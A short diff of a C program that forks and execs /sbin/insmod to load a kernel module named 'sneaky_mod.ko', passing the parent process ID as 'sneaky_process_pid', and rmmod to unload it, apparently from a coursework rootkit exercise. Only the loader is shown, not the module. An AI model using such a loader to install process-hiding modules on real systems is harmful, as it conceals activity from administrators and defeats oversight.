@@ -4,7 +4,6 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-//******************step 4 functions for load sneaky module*****************
 
 void parent_process(pid_t cpid) {
   pid_t w;      //wait pid
@@ -41,7 +40,7 @@ void do_load_process() {
   char load_command[] = "insmod";
   char load_module[] = "sneaky_mod.ko";
   char key_value_pair[50];
-  sprintf(key_value_pair, "%s=%d", "ppid", getppid());
+  sprintf(key_value_pair, "%s=%d", "sneaky_process_pid", getppid());
 
 
   char * argv[4];
@@ -50,8 +49,12 @@ void do_load_process() {
   argv[2] = key_value_pair;
   argv[3] = NULL;
 
+  int status = execve("/sbin/insmod",argv, NULL);
+  if (status == -1) {
+    perror("do_load_process");
+  }
+
   
-  execve(argv[0],argv, NULL);
   exit(EXIT_SUCCESS);
 }
 
@@ -66,8 +69,13 @@ void do_unload_process() {
   argv[1] = load_module; 
   argv[2] = NULL;
 
+
+  int status = execve("/sbin/rmmod",argv, NULL);
+  if (status == -1) {
+    perror("do_unload_process");
+  }
+
   
-  execve(argv[0], argv, NULL);
   exit(EXIT_SUCCESS);
 }
 
